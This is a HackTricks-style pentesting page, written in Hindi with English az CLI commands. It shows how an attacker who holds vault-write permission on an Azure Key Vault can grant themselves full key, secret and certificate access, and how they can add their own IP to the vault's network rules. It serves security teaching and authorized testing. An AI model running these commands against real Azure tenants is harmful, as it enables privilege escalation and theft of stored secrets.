# Az - Key Vault Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Key Vault

इस सेवा के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../az-services/az-keyvault.md
{{#endref}}

### `Microsoft.KeyVault/vaults/write`

इस अनुमति के साथ एक हमलावर एक की वॉल्ट की नीति को संशोधित करने में सक्षम होगा (की वॉल्ट को RBAC के बजाय एक्सेस नीतियों का उपयोग करना चाहिए)।
```bash
# If access policies in the output, then you can abuse it
az keyvault show --name <vault-name>

# Get current principal ID
az ad signed-in-user show --query id --output tsv

# Assign all permissions
az keyvault set-policy \
--name <vault-name> \
--object-id <your-object-id> \
--key-permissions all \
--secret-permissions all \
--certificate-permissions all \
--storage-permissions all
```
### Modify Network Restrictions

यह संभव है कि आपके पास संवेदनशील डेटा (जैसे एक गुप्त का मान) तक पहुँचने के लिए पर्याप्त अनुमतियाँ हों, लेकिन आप इसे एक्सेस नहीं कर पा रहे हैं क्योंकि की वॉल्ट एक विशिष्ट नेटवर्क तक सीमित है। यदि आपके पास नेटवर्क प्रतिबंधों को संशोधित करने की अनुमति है, तो आप अपनी IP को अनुमत IPs की सूची में जोड़ सकते हैं।
```bash
# Get the current network restrictions
az keyvault network-rule list --name <vault-name>

# Add your IP to the list
az keyvault network-rule add --name <vault-name> --ip-address <your-ip>
```
{{#include ../../../banners/hacktricks-training.md}}
